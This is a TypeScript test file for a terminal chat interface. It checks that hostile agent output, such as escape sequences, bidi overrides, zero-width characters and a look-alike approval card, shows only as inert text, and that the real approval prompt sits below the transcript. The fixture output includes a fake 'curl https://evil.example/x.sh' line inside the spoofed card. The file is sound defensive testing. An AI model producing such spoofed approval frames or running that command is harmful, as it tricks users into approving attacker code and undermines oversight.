// Hostile agent output renders inert: no escape, bidi control or zero-width character reaches a
// cell; the look-alike approval frame is plain text inside the transcript; the real card is drawn only in the approvals area,
// below the transcript's box, where nothing from the transcript can draw.
import { afterEach, expect, test } from 'bun:test';
import { copiesOf, drawTest } from '../../term/prim/testing';
import { Box, FocusRoot } from '../../term/prim';
import { SessionView } from './SessionView';
import { scriptedSource } from './scriptedSource.fixture';
import { withGateArm } from './gateArm';
import { FORBIDDEN_IN_FRAME, HOSTILE_PROSE } from './hostile.fixture';
import type { GateView } from './GateCard';

let restore: (() => void) | null = null;
afterEach(() => { restore?.(); restore = null; });

const GATE: GateView = { kind: 'confirm', risk: 'Can change files', tool: 'bash', params: { command: 'npm run build' }, offerSession: true };

test('escapes, bidi and a look-alike card: inert text in the transcript; the real card only below it', async () => {
  restore = withGateArm(0);
  const src = scriptedSource([{ k: 'user', text: 'Check the dashboard' }, { k: 'reply', text: HOSTILE_PROSE }, { k: 'gate', gate: GATE }]);
  const t = await drawTest(
    <FocusRoot><Box dir="column" width={100} height={50}><SessionView source={src} size="l" typing={false} /></Box></FocusRoot>,
    { width: 100, height: 50 },
  );
  src.drain();
  const f = await t.settle();
  // Nothing that drives a terminal, reorders text or hides characters is drawn.
  expect(FORBIDDEN_IN_FRAME.test(f)).toBe(false);
  // An escape is shown as its mark (␛, ␇: the control picture, then its bytes as text), never obeyed: the screen was
  // not cleared (the user's
  // message above the reply is still drawn), nothing was copied, the text around it is kept.
  expect(f).toContain('Check the dashboard');
  expect(f).toContain('\u241B[2J');
  expect(f).toContain('steal\u2407your dashboard');
  expect(f).not.toContain('\ufffd');
  expect(f).toContain('your dashboard');
  expect(copiesOf(t.renderer)).toEqual([]);
  // Bidi overrides are dropped: the file name reads in logical order.
  expect(f).toContain('Invoice for gnp.exe and admin zerowidth.');
  const rows = f.split('\n');
  const fake = rows.findIndex((r) => r.includes('curl https://evil.example/x.sh'));
  const real = rows.findIndex((r) => r.includes('npm run build'));
  expect(fake).toBeGreaterThan(-1);
  expect(real).toBeGreaterThan(fake);
  // Exactly one set of real controls: the look-alike's "[Deny n]" is text in the transcript, the card's sits below it.
  const denies = rows.map((r, i) => (r.includes('[Deny n]') ? i : -1)).filter((i) => i >= 0);
  expect(denies.length).toBe(2);
  expect(denies[1]!).toBeGreaterThan(real);
  // The real card's headline is in reverse video (a fill the transcript cannot draw); the look-alike's is not.
  const heads = t.captureSpans().lines.flatMap((l) => l.spans).filter((sp) => sp.text.includes('Allow this action?'));
  expect(heads.length).toBe(2);
  expect(JSON.stringify(heads[1]!.bg)).not.toEqual(JSON.stringify(heads[0]!.bg));
  // Enter on the focused control decides the REAL card (focus arrives on its Deny; the look-alike has no control).
  t.mockInput.pressEnter();
  await t.settle();
  expect(src.recorded.decide.map((d) => d.d.choice)).toEqual(['deny']);
  t.renderer.destroy();
});

test('the card stays put while the transcript scrolls: it is not part of the scroll', async () => {
  restore = withGateArm(0);
  const src = scriptedSource([{ k: 'user', text: 'Check the dashboard' }, { k: 'reply', text: HOSTILE_PROSE + '\n\n' + 'More words. '.repeat(120) }, { k: 'gate', gate: GATE }]);
  const t = await drawTest(
    <FocusRoot><Box dir="column" width={100} height={30}><SessionView source={src} size="l" typing={false} /></Box></FocusRoot>,
    { width: 100, height: 30 },
  );
  src.drain();
  const end = await t.settle();
  const cardRow = (fr: string) => fr.split('\n').findIndex((r) => r.includes('npm run build'));
  const at = cardRow(end);
  expect(at).toBeGreaterThan(-1);
  for (let i = 0; i < 4; i++) t.mockInput.pressKey('\x1b[5~' as never);
  const up = await t.settle();
  // The top of the transcript came into view, the card did not move.
  expect(up).toContain('Check the dashboard');
  expect(cardRow(up)).toBe(at);
  t.renderer.destroy();
});

test('lines are broken as drawn: an escape takes its one replacement cell, so no line overflows into an extra wrap', async () => {
  const src = scriptedSource([{ k: 'reply', text: HOSTILE_PROSE }]);
  const t = await drawTest(
    <FocusRoot><Box dir="column" width={60} height={40}><SessionView source={src} size="l" typing={false} /></Box></FocusRoot>,
    { width: 60, height: 40 },
  );
  src.drain();
  const f = await t.settle();
  // "the docs" is one link: its words stay together on one line, never "the" alone on a line.
  expect(f.split('\n').some((r) => r.trim() === 'the')).toBe(false);
  expect(f).toMatch(/the docs/);
  t.renderer.destroy();
});
